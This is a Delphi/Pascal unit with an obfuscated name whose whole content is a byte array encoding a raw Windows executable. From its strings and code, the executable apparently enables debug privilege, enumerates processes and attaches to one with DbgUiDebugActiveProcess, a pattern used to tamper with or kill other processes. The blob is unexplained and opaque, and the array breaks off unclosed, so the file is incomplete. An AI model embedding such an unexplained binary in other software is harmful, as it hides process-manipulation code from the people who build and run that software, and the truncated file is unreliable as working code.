{$E EXE}
{$IMAGEBASE $00410000}
{$R-}
{$Q-}
{$IFDEF minimum}
program oXueTb;
{$ENDIF}
unit oXueTb;
interface

uses
  Windows,
  WinNative,
  RTL,
  LDasm;

implementation

{$R Resources.res}

var
  tmp2: LBuf;

const
  hinst = $00410000;

  data: array[0..4607] of byte = (
    $4D, $5A, $50, $00, $02, $00, $00, $00, $04, $00, $0F, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $1A, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $00,
    $BA, $10, $00, $0E, $1F, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $90, $90,
    $54, $68, $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $6D, $75, $73,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $75, $6E, $64, $65, $72, $20, $57,
    $69, $6E, $33, $32, $0D, $0A, $24, $37, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $50, $45, $00, $00, $4C, $01, $06, $00, $19, $5E, $42, $2A, $00, $00, $00, $00,
    $00, $00, $00, $00, $E0, $00, $8E, $A1, $0B, $01, $02, $19, $00, $06, $00, $00,
    $00, $08, $00, $00, $00, $00, $00, $00, $14, $14, $00, $00, $00, $10, $00, $00,
    $00, $20, $00, $00, $00, $00, $40, $00, $00, $10, $00, $00, $00, $02, $00, $00,
    $01, $00, $00, $00, $00, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $00,
    $00, $70, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $02, $00, $00, $00,
    $00, $00, $10, $00, $00, $40, $00, $00, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $40, $00, $00, $96, $01, $00, $00, $00, $60, $00, $00, $00, $02, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $50, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $43, $4F, $44, $45, $00, $00, $00, $00,
    $2C, $04, $00, $00, $00, $10, $00, $00, $00, $06, $00, $00, $00, $04, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $60,
    $44, $41, $54, $41, $00, $00, $00, $00, $04, $00, $00, $00, $00, $20, $00, $00,
    $00, $02, $00, $00, $00, $0A, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $42, $53, $53, $00, $00, $00, $00, $00,
    $35, $00, $00, $00, $00, $30, $00, $00, $00, $00, $00, $00, $00, $0C, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $C0,
    $2E, $69, $64, $61, $74, $61, $00, $00, $96, $01, $00, $00, $00, $40, $00, $00,
    $00, $02, $00, $00, $00, $0C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $2E, $72, $65, $6C, $6F, $63, $00, $00,
    $50, $00, $00, $00, $00, $50, $00, $00, $00, $02, $00, $00, $00, $0E, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $2E, $72, $73, $72, $63, $00, $00, $00, $00, $02, $00, $00, $00, $60, $00, $00,
    $00, $02, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $70, $00, $00, $00, $00, $00, $00, $00, $12, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $FF, $25, $5C, $40, $40, $00, $8B, $C0, $FF, $25, $58, $40, $40, $00, $8B, $C0,
    $FF, $25, $54, $40, $40, $00, $8B, $C0, $FF, $25, $50, $40, $40, $00, $8B, $C0,
    $FF, $25, $4C, $40, $40, $00, $8B, $C0, $FF, $25, $48, $40, $40, $00, $8B, $C0,
    $FF, $25, $44, $40, $40, $00, $8B, $C0, $FF, $25, $40, $40, $40, $00, $8B, $C0,
    $FF, $25, $3C, $40, $40, $00, $8B, $C0, $FF, $25, $38, $40, $40, $00, $8B, $C0,
    $FF, $25, $34, $40, $40, $00, $8B, $C0, $FF, $25, $30, $40, $40, $00, $8B, $C0,
    $FF, $25, $2C, $40, $40, $00, $8B, $C0, $FF, $25, $28, $40, $40, $00, $8B, $C0,
    $55, $8B, $EC, $53, $C7, $00, $18, $00, $00, $00, $8B, $5D, $10, $89, $58, $04,
    $89, $50, $08, $89, $48, $0C, $8B, $55, $0C, $89, $50, $10, $8B, $55, $08, $89,
    $50, $14, $5B, $5D, $C2, $0C, $00, $90, $55, $8B, $EC, $83, $C4, $CC, $53, $80,
    $7D, $10, $00, $74, $13, $8D, $45, $FC, $50, $6A, $00, $6A, $28, $6A, $FE, $E8,
    $84, $FF, $FF, $FF, $8B, $D8, $EB, $0F, $8D, $45, $FC, $50, $6A, $28, $6A, $FF,
    $E8, $8B, $FF, $FF, $FF, $8B, $D8, $85, $DB, $74, $04, $8B, $C3, $EB, $65, $8B,
    $45, $08, $33, $D2, $89, $45, $F0, $89, $55, $F4, $C7, $45, $DC, $01, $00, $00,
    $00, $8B, $45, $F0, $89, $45, $E0, $8B, $45, $F4, $89, $45, $E4, $80, $7D, $0C,
    $00, $74, $09, $C7, $45, $E8, $02, $00, $00, $00, $EB, $05, $33, $C0, $89, $45,
    $E8, $8D, $45, $EC, $50, $8D, $45, $CC, $50, $6A, $10, $8D, $45, $DC, $50, $6A,
    $00, $8B, $45, $FC, $50, $E8, $3E, $FF, $FF, $FF, $8B, $D8, $8B, $45, $FC, $50,
    $E8, $0B, $FF, $FF, $FF, $81, $FB, $06, $01, $00, $00, $75, $05, $BB, $61, $00,
    $00, $C0, $8B, $C3, $5B, $8B, $E5, $5D, $C2, $0C, $00, $90, $64, $8B, $05, $18,
    $00, $00, $00, $8B, $40, $20, $C3, $90, $5C, $00, $42, $00, $61, $00, $73, $00,
    $65, $00, $4E, $00, $61, $00, $6D, $00, $65, $00, $64, $00, $4F, $00, $62, $00,
    $6A, $00, $65, $00, $63, $00, $74, $00, $73, $00, $5C, $00, $6F, $00, $78, $00,
    $75, $00, $65, $00, $74, $00, $62, $00, $00, $00, $00, $00, $55, $8B, $EC, $83,
    $C4, $DC, $53, $56, $8B, $75, $08, $33, $DB, $89, $75, $F4, $33, $C0, $89, $45,
    $F8, $6A, $00, $6A, $00, $6A, $00, $8D, $45, $DC, $33, $C9, $33, $D2, $E8, $CD,
    $FE, $FF, $FF, $8D, $45, $F4, $50, $8D, $45, $DC, $50, $68, $FF, $0F, $1F, $00,
    $8D, $45, $FC, $50, $E8, $6F, $FE, $FF, $FF, $85, $C0, $75, $0B, $8B, $45, $FC,
    $50, $E8, $6A, $FE, $FF, $FF, $B3, $01, $85, $F6, $74, $05, $83, $FE, $04, $75,
    $02, $B3, $01, $8B, $C3, $5E, $5B, $8B, $E5, $5D, $C2, $04, $00, $8D, $40, $00,
    $53, $56, $57, $83, $C4, $DC, $33, $C0, $89, $44, $24, $08, $C7, $04, $24, $00,
    $00, $40, $00, $6A, $04, $68, $00, $10, $00, $00, $8D, $44, $24, $08, $50, $6A,
    $00, $8D, $44, $24, $18, $50, $6A, $FF, $E8, $33, $FE, $FF, $FF, $83, $7C, $24,
    $08, $00, $0F, $84, $23, $01, $00, $00, $54, $8B, $44, $24, $04, $50, $8B, $44,
    $24, $10, $50, $6A, $05, $E8, $F6, $FD, $FF, $FF, $85, $C0, $75, $29, $8B, $5C,
    $24, $08, $8B, $43, $44, $50, $E8, $41, $FF, $FF, $FF, $84, $C0, $75, $0A, $8B,
    $43, $44, $A3, $0C, $30, $40, $00, $EB, $0E, $8B, $03, $85, $C0, $74, $08, $8B,
    $D3, $03, $D0, $8B, $DA, $EB, $DB, $33, $C0, $89, $04, $24, $68, $00, $80, $00,
    $00, $8D, $44, $24, $04, $50, $8D, $44, $24, $10, $50, $6A, $FF, $E8, $D6, $FD,
    $FF, $FF, $33, $C0, $A3, $08, $30, $40, $00, $C7, $04, $24, $00, $00, $40, $00,
    $33, $C0, $89, $44, $24, $04, $6A, $04, $68, $00, $10, $00, $00, $8D, $44, $24,
    $08, $50, $6A, $00, $8D, $44, $24, $14, $50, $6A, $FF, $E8, $A0, $FD, $FF, $FF,
    $83, $7C, $24, $04, $00, $0F, $84, $90, $00, $00, $00, $54, $68, $00, $00, $40,
    $00, $8B, $44, $24, $0C, $50, $6A, $10, $E8, $63, $FD, $FF, $FF, $8B, $44, $24,
    $04, $8B, $30, $4E, $85, $F6, $7C, $58, $46, $33, $DB, $E8, $6C, $FE, $FF, $FF,
    $8B, $FB, $03, $FF, $8B, $54, $24, $04, $3B, $44, $FA, $04, $75, $3E, $8B, $44,
    $24, $04, $80, $7C, $F8, $08, $05, $75, $33, $8B, $44, $24, $04, $0F, $B7, $44,
    $F8, $0A, $8B, $F8, $54, $6A, $18, $8D, $44, $24, $14, $50, $6A, $00, $57, $E8,
    $14, $FD, $FF, $FF, $85, $C0, $75, $14, $8B, $44, $24, $1C, $3B, $05, $0C, $30,
    $40, $00, $75, $08, $89, $3D, $08, $30, $40, $00, $EB, $04, $43, $4E, $75, $AB,
    $33, $C0, $89, $04, $24, $68, $00, $80, $00, $00, $8D, $44, $24, $04, $50, $8D,
    $44, $24, $0C, $50, $6A, $FF, $E8, $0D, $FD, $FF, $FF, $83, $C4, $24, $5F, $5E,
    $5B, $C3, $8B, $C0, $55, $8B, $EC, $51, $53, $56, $8B, $F0, $33, $DB, $E8, $15,
    $FD, $FF, $FF, $85, $C0, $75, $23, $56, $E8, $03, $FD, $FF, $FF, $85, $C0, $75,
    $19, $64, $8B, $05, $18, $00, $00, $00, $89, $45, $FC, $8B, $45, $FC, $8B, $80,
    $BC, $0A, $00, $00, $50, $E8, $B6, $FC, $FF, $FF, $8B, $C3, $5E, $5B, $59, $5D,
    $C3, $8D, $40, $00, $A1, $08, $30, $40, $00, $E8, $B6, $FF, $FF, $FF, $A1, $08,
    $30, $40, $00, $50, $E8, $97, $FC, $FF, $FF, $C3, $8B, $C0, $33, $C0, $A3, $10,
    $30, $40, $00, $6A, $00, $6A, $01, $6A, $14, $E8, $EA, $FC, $FF, $FF, $A1, $00,
    $20, $40, $00, $50, $68, $2C, $30, $40, $00, $E8, $52, $FC, $FF, $FF, $6A, $00,
    $6A, $00, $6A, $00, $BA, $2C, $30, $40, $00, $B8, $14, $30, $40, $00, $B9, $40,
    $00, $00, $00, $E8, $98, $FC, $FF, $FF, $68, $14, $30, $40, $00, $68, $03, $00,
    $1F, $00, $68, $10, $30, $40, $00, $E8, $14, $FC, $FF, $FF, $85, $C0, $75, $22,
    $E8, $EB, $FD, $FF, $FF, $E8, $8A, $FF, $FF, $FF, $6A, $00, $A1, $10, $30, $40,
    $00, $50, $E8, $01, $FC, $FF, $FF, $A1, $10, $30, $40, $00, $50, $E8, $1E, $FC,
    $FF, $FF, $C3, $90, $83, $2D, $04, $30, $40, $00, $01, $73, $0B, $E8, $7A, $FF,
    $FF, $FF, $31, $C0, $40, $C2, $0C, $00, $C3, $8D, $40, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $48, $11, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $64, $40, $00, $00,
    $28, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $6E, $40, $00, $00, $82, $40, $00, $00,
    $9C, $40, $00, $00, $B6, $40, $00, $00, $CC, $40, $00, $00, $E2, $40, $00, $00,
    $FC, $40, $00, $00, $10, $41, $00, $00, $1A, $41, $00, $00, $2A, $41, $00, $00,
    $46, $41, $00, $00, $62, $41, $00, $00, $7A, $41, $00, $00, $88, $41, $00, $00,
    $00, $00, $00, $00, $6E, $74, $64, $6C, $6C, $2E, $64, $6C, $6C, $00, $00, $00,
    $44, $62, $67, $55, $69, $43, $6F, $6E, $6E, $65, $63, $74, $54, $6F, $44, $62,
    $67, $00, $00, $00, $44, $62, $67, $55, $69, $44, $65, $62, $75, $67, $41, $63,
    $74, $69, $76, $65, $50, $72, $6F, $63, $65, $73, $73, $00, $00, $00, $5A, $77,
    $41, $64, $6A, $75, $73, $74, $50, $72, $69, $76, $69, $6C, $65, $67, $65, $73,
    $54, $6F, $6B, $65, $6E, $00, $00, $00, $5A, $77, $4F, $70, $65, $6E, $50, $72,
    $6F, $63, $65, $73, $73, $54, $6F, $6B, $65, $6E, $00, $00, $00, $00, $5A, $77,
    $46, $72, $65, $65, $56, $69, $72, $74, $75, $61, $6C, $4D, $65, $6D, $6F, $72,
    $79, $00, $00, $00, $5A, $77, $41, $6C, $6C, $6F, $63, $61, $74, $65, $56, $69,
    $72, $74, $75, $61, $6C, $4D, $65, $6D, $6F, $72, $79, $00, $00, $00, $5A, $77,
    $4F, $70, $65, $6E, $54, $68, $72, $65, $61, $64, $54, $6F, $6B, $65, $6E, $00,
    $00, $00, $5A, $77, $43, $6C, $6F, $73, $65, $00, $00, $00, $5A, $77, $4F, $70,
    $65, $6E, $50, $72, $6F, $63, $65, $73, $73, $00, $00, $00, $5A, $77, $51, $75,
    $65, $72, $79, $53, $79, $73, $74, $65, $6D, $49, $6E, $66, $6F, $72, $6D, $61,
    $74, $69, $6F, $6E, $00, $00, $00, $00, $5A, $77, $51, $75, $65, $72, $79, $49,
    $6E, $66, $6F, $72, $6D, $61, $74, $69, $6F, $6E, $50, $72, $6F, $63, $65, $73,
    $73, $00, $00, $00, $52, $74, $6C, $49, $6E, $69, $74, $55, $6E, $69, $63, $6F,
    $64, $65, $53, $74, $72, $69, $6E, $67, $00, $00, $00, $00, $5A, $77, $53, $65,
    $74, $45, $76, $65, $6E, $74, $00, $00, $00, $00, $5A, $77, $4F, $70, $65, $6E,
    $45, $76, $65, $6E, $74, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $10, $00, $00, $44, $00, $00, $00, $02, $30, $0A, $30, $12, $30, $1A, $30,
    $22, $30, $2A, $30, $32, $30, $3A, $30, $42, $30, $4A, $30, $52, $30, $5A, $30,
    $62, $30, $6A, $30, $43, $32, $75, $32, $0E, $33, $16, $33, $85, $33, $8F, $33,
    $9F, $33, $AF, $33, $B5, $33, $C5, $33, $CA, $33, $D9, $33, $E3, $33, $FD, $33,
    $08, $34, $16, $34, $00, $20, $00, $00, $0C, $00, $00, $00, $00, $30, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $53, $76, $65, $3C, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
